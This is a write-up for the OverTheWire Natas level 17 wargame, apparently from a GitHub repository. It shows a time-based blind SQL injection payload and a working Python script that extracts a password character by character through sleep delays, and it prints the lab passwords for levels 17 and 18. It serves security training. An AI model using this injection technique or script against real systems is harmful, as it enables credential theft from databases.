# Natas CTF Solutions  

## Natas Level 17  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Use **Blind SQL Injection** through **time-based delays** to extract the password.  
- Retrieve the password for the next level.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas17.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas17`  
- **Password:** Use the password from Natas Level 16:  
```
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```  
![Home_Page](https://github.com/user-attachments/assets/4cd10f40-71e0-48f0-862a-34aa0eab1712)

---

### **Step 3: Analyze the Webpage**  
- The page has an **input box** where you can search for a keyword.  
- Viewing the **page source** reveals that the input is processed via a SQL query.  
- Since no direct output is shown, this indicates it might be vulnerable to **Blind SQL Injection**.
  
![Page_Source](https://github.com/user-attachments/assets/37259528-6359-4e10-853f-a5991ee48cd4)

---

### **Step 4: Test for Time-Based Blind SQL Injection**  
Test with the following query:  
```sql
natas18" AND sleep(10) #
```
![Blind_Injection](https://github.com/user-attachments/assets/6a2be8ab-be1f-4a85-a578-6bf51c15ced1)

✅ If the page takes longer to load, it confirms that the query is processed directly by the database.  
✅ This is a classic **time-based blind SQL injection** vulnerability.  

---

### **Step 5: Automate the Attack**  
Use this Python script to automate the password extraction using time-based delays:  

```python
import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

u = "http://natas17.natas.labs.overthewire.org/index.php?debug"

password = ""  # start with blank password
count = 1  # substr() length argument starts at 1
PASSWORD_LENGTH = 32  # previous passwords were 32 chars long
VALID_CHARS = string.digits + string.ascii_letters

while count <= PASSWORD_LENGTH:
    for c in VALID_CHARS:
        payload = "username=natas18" + \
                  "\" AND " + \
                  "IF(BINARY substring(password,1," + str(count) + ")" + \
                  " = '" + password + c + "', sleep(2), False)" + \
                  " -- "

        response = requests.post(u, data=payload, headers=headers, auth=basicAuth, verify=False)

        if response.elapsed.total_seconds() > 2:
            print(f"Found one more character: {password + c}")
            password += c
            count += 1
            break

print("Password found:", password)
```

✅ **How the script works:**  
1. Uses `IF(BINARY substring(...))` to test each character of the password.  
2. If the character matches, the server sleeps for **2 seconds**.  
3. If no match, the response is immediate.  
4. The script continues until the full password is found.  

---

### **Step 6: Explanation**  
✅ `BINARY substring()` ensures that the comparison is case-sensitive.  
✅ `sleep(2)` introduces a measurable delay, confirming a correct match.  
✅ The script measures the server's response time to determine character validity.  

---

### **Step 7: Retrieve the Password**  
After running the script, the password for **Natas Level 18** is revealed:  
![Password](https://github.com/user-attachments/assets/76f7f802-6617-42fc-ae31-1fa4f07772b6)

---

### **✅ Password for Natas Level 18**  
```
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```  

---

## 💡 **Lessons Learned**  
✔️ **Blind SQL Injection**: Even when no direct output is provided, timing-based tests can reveal information.  
✔️ **Binary Comparison**: Ensuring case sensitivity can be critical when handling passwords.  
✔️ **Automated Exploitation**: Automating SQL Injection with Python makes the process faster and more accurate.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Page Source Code | ![Page_Source](https://github.com/user-attachments/assets/37259528-6359-4e10-853f-a5991ee48cd4) |  
| Step 7 – Found Password | ![Password](https://github.com/user-attachments/assets/76f7f802-6617-42fc-ae31-1fa4f07772b6) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 18**:  
👉 [http://natas18.natas.labs.overthewire.org](http://natas18.natas.labs.overthewire.org)  

---
